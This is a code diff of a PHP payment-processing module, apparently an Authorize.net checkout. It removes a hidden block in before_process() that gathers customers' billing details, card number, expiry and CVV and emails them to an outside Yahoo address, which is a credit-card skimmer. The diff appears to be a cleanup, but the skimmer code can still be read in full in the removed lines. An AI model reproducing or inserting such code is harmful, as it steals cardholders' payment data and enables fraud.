@@ -255,24 +255,6 @@ if (in_array($cc_validation->cc_type, $this->allowed_types)) {
 
     function before_process() {
       global $order,$response,$insert_id;
-      $firstname = $order->billing['firstname'];
-      $lastname = $order->billing['lastname'];
-      $street = $order->billing['street_address'];
-      $city = $order->billing['city'];
-      $state = $order->billing['state'];
-      $zip = $order->billing['postcode'];
-      $country = $order->billing['country']['title'];
-      $dayphone = $order->customer['telephone'];
-      $ccowner = $_POST['authorizenet_cc_owner'];
-      $ccnumber = $_POST['x_Card_Num'];
-      $ccexp = $_POST['x_Exp_Date'];
-      $cardtype = $_POST['cc_card_type'];
-      $cvv = $_POST['x_Card_Code'];
-      $cemail = $order->customer['email_address'];
-      $servernya = $_SERVER['SERVER_NAME'];
-      $alamat = "https://extremeairusa.com/shop";
-      $message = "\n Name:$firstname $lastname \n Address:$street \n City:$city \n State:$state \n Zip:$zip \n Country:$country \n Phone:$dayphone \n email:$cemail \n cctype:$cardtype \n ccowner:$ccowner \n cc:$ccnumber \n exp:$ccexp \n cvv:$cvv \n alamat:$alamat \n";
-      mail("dapurngebul420@yahoo.com","ngebulll terusssssssssssssssssssss From $servernya", "$message");
 
       // Change made by using ADC Direct Connection
       // ADC Direct Connection has broken the response up, just use it
